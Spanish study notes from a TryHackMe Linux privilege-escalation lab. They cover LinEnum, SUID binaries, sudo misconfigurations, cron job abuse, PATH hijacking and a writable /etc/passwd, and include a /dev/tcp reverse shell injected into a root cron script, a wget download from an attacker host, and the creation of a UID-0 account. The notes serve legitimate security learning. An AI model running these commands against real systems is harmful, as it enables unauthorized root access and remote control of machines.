# Common Linux Privilege Escalation — Notas Técnicas

> Notas de la room [Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc) de TryHackMe. Vectores de escalada de privilegios más comunes en sistemas Linux.

---

## Índice

1. [LinEnum](#linenum)
2. [SUID / SGID](#suid-sgid)
3. [Sudo Misconfigurations](#sudo-misconfigurations)
4. [Cron Jobs](#cron jobs)
5. [PATH Hijacking](#path-hijacking)
6. [/etc/passwd Escribible](#etcpasswd-escribible)

---

## LinEnum

Script de bash que automatiza la enumeración de vectores de escalada de privilegios. En lugar de ejecutar manualmente decenas de comandos, lo lanzas y te da todo el output junto.

**Transferirlo a la máquina víctima:**

```bash
# En tu máquina — levantar servidor HTTP
python3 -m http.server 8000

# En la víctima — descargar el script
wget http://TU_IP:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Tu IP (en este caso) es la de la VPN de THM (`tun0`):

```bash
ip a | grep tun0
```

**Secciones clave del output:**

| Sección                                        | Qué buscar                                 |
| ---------------------------------------------- | ------------------------------------------ |
| `[+] We can sudo without supplying a password` | Sudo mal configurado                       |
| `[+] SUID files`                               | Binarios con SUID activado                 |
| `[+] Crontab contents`                         | Tareas programadas                         |
| `[+] World-writable files`                     | Archivos escribibles por cualquier usuario |

> Aunque uses LinEnum, debes saber replicar cada comprobación manualmente. En un pentest real puede que no puedas subir herramientas.

---

## SUID / SGID

### ¿Qué es un binario SUID?

Cuando un binario tiene el bit SUID activado, **se ejecuta con los permisos de su propietario**, no con los del usuario que lo lanza. Si el propietario es root, cualquier usuario que lo ejecute lo hace como root.

### Permisos en Linux — Repaso rápido

```
         user    group   others
         rwx      rwx      rwx
          7        7        7
```

|Permiso|Valor|
|---|---|
|`r` (read)|4|
|`w` (write)|2|
|`x` (execute)|1|

Ejemplo: `chmod 755` → `rwxr-xr-x`

### Cómo se ve el bit SUID/SGID

|Tipo|Representación|
|---|---|
|SUID (bit 4 en owner)|`rws-rwx-rwx`|
|SGID (bit 2 en group)|`rwx-rws-rwx`|

La `s` en lugar de `x` indica que el bit especial está activo.

### Encontrar binarios SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

|Parte|Significado|
|---|---|
|`find /`|Busca desde la raíz|
|`-perm -u=s`|Archivos con el bit SUID activado|
|`-type f`|Solo archivos (no directorios)|
|`2>/dev/null`|Suprime errores de permisos|

### Siguiente paso

Buscar cada binario encontrado en [GTFOBins](https://gtfobins.github.io/) — si tiene método de explotación via SUID, úsalo directamente.

---

## Sudo Misconfigurations

### sudo -l

Es lo primero que ejecutas cuando consigues acceso. Lista los comandos que ese usuario puede correr como root **sin necesitar la contraseña de root**.

```bash
sudo -l
```

Output típico explotable:

```
User user8 may run the following commands:
    (root) NOPASSWD: /usr/bin/vi
```

### Ejemplo: escapar de Vi con privilegios root

```bash
sudo vi
```

Dentro de vi:

```
:!/bin/bash
```

Resultado: shell como root.

### GTFOBins

Cuando encuentras un binario en `sudo -l` o con SUID y no sabes cómo explotarlo:

**[https://gtfobins.github.io](https://gtfobins.github.io)**

Buscas el binario por nombre → seleccionas `sudo` o `SUID` según el caso → sigues los pasos.

---

## Cron Jobs

### ¿Qué es Cron?

Demonio que ejecuta comandos de forma programada. Los trabajos se definen en el crontab y pueden correr como cualquier usuario, incluyendo root.

```bash
cat /etc/crontab
```

Hay que revisarlo siempre manualmente, incluso si LinEnum no encuentra nada.

### Formato del crontab

```
#  m    h   dom  mon  dow   user     command
17  *    1   *    *    *    root     /script.sh
```

| Campo     | Significado                    |
| --------- | ------------------------------ |
| `m`       | Minuto (0-59)                  |
| `h`       | Hora (0-23)                    |
| `dom`     | Día del mes (1-31)             |
| `mon`     | Mes (1-12)                     |
| `dow`     | Día de la semana (0-7)         |
| `user`    | Usuario que ejecuta el comando |
| `command` | Comando a ejecutar             |

`*` = cualquier valor. `*/5` en minutos = cada 5 minutos.

### Vector de explotación

**Condición:** un script que es propiedad de root está en crontab, pero tú tienes permisos de escritura sobre él.

```bash
# Inyectar reverse shell en el script
echo 'bash -i >& /dev/tcp/TU_IP/PORT 0>&1' >> /ruta/al/script.sh

# Escuchar en tu máquina
nc -lvnp PORT
```

### Flujo de ataque

1. `cat /etc/crontab` → identificar scripts que corren como root
2. `ls -la /ruta/script.sh` → comprobar si tienes escritura
3. Inyectar reverse shell en el script
4. Poner listener en tu máquina
5. Esperar a que el cron se ejecute → shell como root

---

## PATH Hijacking

### ¿Qué es PATH?

Variable de entorno que define los directorios donde el sistema busca ejecutables cuando lanzas un comando.

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

El sistema recorre esos directorios de izquierda a derecha hasta encontrar el binario.

### Vector de explotación

**Condición:** un binario SUID llama a otro comando **sin ruta absoluta** (ej: llama a `ls` en lugar de `/bin/ls`).

### Identificar si el binario es vulnerable

```bash
# Opción 1 — strings (puede no mostrar nada si está muy compilado)
strings /ruta/al/binario

# Opción 2 — ltrace (traza llamadas a librerías en tiempo real)
ltrace ./binario

# Opción 3 — strace
strace ./binario 2>&1 | grep exec
```

Si `ltrace` muestra que llama a `ls`, `ps`, u otro comando sin ruta absoluta → vulnerable.

### Flujo de ataque

```bash
# 1. Crear el ejecutable falso
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls

# 2. Poner /tmp al inicio del PATH
export PATH=/tmp:$PATH

# 3. Ejecutar el binario SUID
~/script
# Llama a "ls" → encuentra /tmp/ls primero → ejecuta bash como root
```

### Por qué funciona

El sistema busca `ls` en el PATH de izquierda a derecha. Al poner `/tmp` primero, encuentra tu versión antes que `/bin/ls`. Como el binario tiene SUID de root, tu archivo falso también se ejecuta con esos privilegios.

---

## /etc/passwd Escribible

### ¿Por qué es un vector de PrivEsc?

`/etc/passwd` debe ser readable por todos pero **escribible solo por root**. Si puedes escribir en él, puedes crear una cuenta con UID 0 → root directo.

### Formato de /etc/passwd

```
username:password:UID:GID:comentario:home:shell
```

| Campo      | Significado                                                                                  |
| ---------- | -------------------------------------------------------------------------------------------- |
| `username` | Nombre de login                                                                              |
| `password` | `x` = hash en `/etc/shadow`. Si pones un hash aquí directamente, lo usa sin consultar shadow |
| `UID`      | 0 = root                                                                                     |
| `GID`      | Grupo principal                                                                              |
| `home`     | Directorio home                                                                              |
| `shell`    | Shell al hacer login                                                                         |

### Flujo de ataque

```bash
# 1. Generar hash de una contraseña que conozcas
openssl passwd -1 -salt abc password123

# 2. Añadir nueva entrada con UID 0
echo 'newroot:[hash]:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. Cambiar al nuevo usuario
su newroot
whoami  # root
```

### Por qué funciona

Al poner el hash directamente en el campo `password` (en lugar de `x`), el sistema autentica contra ese hash sin ir a `/etc/shadow`. Con `UID=0` el sistema trata esa cuenta exactamente igual que a root.

### Detección

```bash
ls -la /etc/passwd
# LinEnum lo detecta en: [+] World-writable files
```
